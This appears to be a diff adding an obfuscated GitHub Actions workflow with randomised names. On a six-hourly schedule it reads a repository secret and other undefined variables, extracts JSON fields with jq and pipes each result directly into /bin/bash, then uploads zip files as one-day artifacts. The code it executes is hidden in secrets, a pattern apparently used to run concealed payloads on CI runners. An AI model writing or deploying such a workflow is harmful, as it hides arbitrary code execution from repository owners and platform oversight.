@@ -1,0 +1,32 @@
+name: perlchristinafresh
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 0,6,12,18 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: perlchristinafresh
+        env:
+          q811: ${{ secrets.q811 }}
+        run: |
+          printf '%s' "$q811" | jq -r .vgckz335 | /bin/bash
+          echo $amvbs15 | jq -r .cc46969 | /bin/bash
+          echo $mfyq5836 | jq -r .xeca37077 | /bin/bash
+          printf '%s' "$i895" | jq -r .gyuv35 | /bin/bash
+          printf '%s' "$p473" | jq -r .zxlxu85 | /bin/bash
+          echo $qnyr7140 | jq -r .bmio53763 | /bin/bash
+          echo $jim4 | jq -r .j5952 | /bin/bash
+          printf '%s' "$vtrlr1" | jq -r .bid6 | /bin/bash
+          echo $umb02 | jq -r .nsfej09918 | /bin/bash
+          echo $v39614 | jq -r .s37 | /bin/bash
+          echo $vxlk6 | jq -r .w968 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ZLPYHJ9o
+          path: "*.zip"
+          retention-days: 1
